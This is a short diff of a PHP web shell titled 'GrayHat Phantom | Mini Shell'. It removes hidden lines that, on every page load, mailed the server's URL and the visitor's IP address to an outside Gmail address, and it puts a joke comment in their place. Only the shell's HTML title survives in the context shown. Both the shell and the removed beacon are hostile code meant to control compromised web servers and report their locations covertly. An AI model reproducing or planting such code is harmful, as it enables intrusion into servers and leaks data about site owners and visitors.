@@ -1,9 +1,7 @@
-
 <?php
-$apper = 'ph.luffy1337@gmail.com';
-$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$ms = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($apper, "LOG", $ms, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+/*
+awit tayo par
+*/
 echo '<html>
 <head>
 <title>GrayHat Phantom | Mini Shell</title>
